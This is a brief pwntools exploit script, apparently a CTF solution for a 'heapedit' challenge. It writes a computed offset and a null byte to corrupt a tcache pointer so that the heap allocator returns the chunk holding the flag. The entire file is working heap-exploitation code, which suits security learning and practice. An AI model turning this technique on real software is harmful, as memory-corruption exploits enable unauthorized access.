from pwn import (
    args,
    gdb,
    remote,
    process,
    p64,
    u64,
    flat,
    ROP,
    ELF,
    context,
    log,
    sys,
    warnings,
)


def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)


warnings.filterwarnings("ignore")
gdbscript = """
init-pwndbg
continue
""".format(**locals())

exe = "./heapedit_patched"
elf = context.binary = ELF(exe, checksec=False)
context.log_level = "info"
# context.terminal = "kitty"

io = start()

# tache_address = 0x602088
# start_write_address = 0x6034a0

offset = 0x602088 - 0x6034A0

io.sendline(str(offset).encode("utf-8"))
io.sendline(
    b"\x00"
)  # overwrite last byte with null byte because chunks that contains flag is 0x603800 and the address that currently in tcache is 0x603890

io.interactive()
